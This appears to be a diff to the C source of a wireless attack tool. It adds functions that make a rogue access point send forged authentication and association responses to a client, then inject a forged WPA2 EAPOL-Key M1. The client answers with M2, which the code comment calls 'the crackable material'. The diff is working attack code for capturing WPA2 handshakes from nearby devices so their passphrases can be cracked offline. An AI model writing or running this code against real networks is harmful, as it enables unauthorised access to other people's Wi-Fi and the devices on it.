@@ -222,6 +222,77 @@ int inject_probe_response(struct inject *i, const uint8_t bssid[6],
 	return send_frame(i, pkt, RT_HDR_LEN + pos);
 }
 
+/* A: rogue-AP Authentication response (Open System, success) to `client`. */
+int inject_auth_response(struct inject *i, const uint8_t bssid[6],
+                         const uint8_t client[6])
+{
+	if (!i || !bssid || !client) return -1;
+	uint8_t pkt[RT_HDR_LEN + 24 + 6];
+	memcpy(pkt, RT_TX_HDR, RT_HDR_LEN);
+	uint8_t *f = pkt + RT_HDR_LEN;
+	size_t pos = build_mgmt_hdr(f, 0xb0, client, bssid, bssid);   /* auth (0xb0) */
+	f[pos++] = 0x00; f[pos++] = 0x00;   /* algorithm = Open System */
+	f[pos++] = 0x02; f[pos++] = 0x00;   /* seq = 2 (response) */
+	f[pos++] = 0x00; f[pos++] = 0x00;   /* status = success */
+	return send_frame(i, pkt, RT_HDR_LEN + pos);
+}
+
+/* A: rogue-AP Association response (success, AID 1) to `client`. */
+int inject_assoc_response(struct inject *i, const uint8_t bssid[6],
+                          const uint8_t client[6])
+{
+	if (!i || !bssid || !client) return -1;
+	uint8_t pkt[RT_HDR_LEN + 24 + 6 + sizeof RATES_IE];
+	memcpy(pkt, RT_TX_HDR, RT_HDR_LEN);
+	uint8_t *f = pkt + RT_HDR_LEN;
+	size_t pos = build_mgmt_hdr(f, 0x10, client, bssid, bssid);   /* assoc resp (0x10) */
+	f[pos++] = 0x31; f[pos++] = 0x04;   /* capability info */
+	f[pos++] = 0x00; f[pos++] = 0x00;   /* status = success */
+	f[pos++] = 0x01; f[pos++] = 0xc0;   /* AID = 1 (0xc001) */
+	memcpy(f + pos, RATES_IE, sizeof RATES_IE); pos += sizeof RATES_IE;
+	return send_frame(i, pkt, RT_HDR_LEN + pos);
+}
+
+/* A: inject our own EAPOL-Key M1 (WPA2, pairwise+ack, our ANONCE, MIC=0) as a
+ * FromDS data frame from the rogue AP to `client`. The client answers with M2
+ * (its SNONCE + MIC) — the crackable material. See src/apless.c. */
+int inject_eapol_m1(struct inject *i, const uint8_t bssid[6],
+                    const uint8_t client[6], const uint8_t anonce[32])
+{
+	if (!i || !bssid || !client || !anonce) return -1;
+	uint8_t pkt[RT_HDR_LEN + 24 + 8 + 4 + 95];
+	memcpy(pkt, RT_TX_HDR, RT_HDR_LEN);
+	uint8_t *f = pkt + RT_HDR_LEN;
+	size_t pos = 0;
+
+	/* 802.11 data header, FromDS: addr1=client(DA), addr2=rogue(BSSID), addr3=rogue(SA) */
+	f[pos++] = 0x08; f[pos++] = 0x02;
+	f[pos++] = 0x3a; f[pos++] = 0x01;
+	memcpy(f + pos, client, 6); pos += 6;
+	memcpy(f + pos, bssid,  6); pos += 6;
+	memcpy(f + pos, bssid,  6); pos += 6;
+	f[pos++] = 0x00; f[pos++] = 0x00;                    /* sequence */
+
+	static const uint8_t snap[8] = {0xaa,0xaa,0x03,0x00,0x00,0x00,0x88,0x8e};
+	memcpy(f + pos, snap, 8); pos += 8;                  /* LLC/SNAP, EtherType EAPOL */
+
+	f[pos++] = 0x02; f[pos++] = 0x03;                    /* EAPOL version 2, type 3 (Key) */
+	f[pos++] = 0x00; f[pos++] = 0x5f;                    /* EAPOL length = 95 */
+
+	f[pos++] = 0x02;                                     /* descriptor type = RSN */
+	f[pos++] = 0x00; f[pos++] = 0x8a;                    /* key info: ver2 + pairwise + ack */
+	f[pos++] = 0x00; f[pos++] = 0x10;                    /* key length = 16 */
+	memset(f + pos, 0, 8); f[pos + 7] = 0x01; pos += 8;  /* replay counter = 1 */
+	memcpy(f + pos, anonce, 32); pos += 32;              /* key nonce = ANONCE */
+	memset(f + pos, 0, 16); pos += 16;                   /* key IV */
+	memset(f + pos, 0, 8);  pos += 8;                    /* key RSC */
+	memset(f + pos, 0, 8);  pos += 8;                    /* key ID */
+	memset(f + pos, 0, 16); pos += 16;                   /* key MIC = 0 (M1) */
+	f[pos++] = 0x00; f[pos++] = 0x00;                    /* key data length = 0 */
+
+	return send_frame(i, pkt, RT_HDR_LEN + pos);
+}
+
 int inject_assoc(struct inject *i, const uint8_t bssid[6],
                  const char *ssid, uint8_t ssid_len)
 {
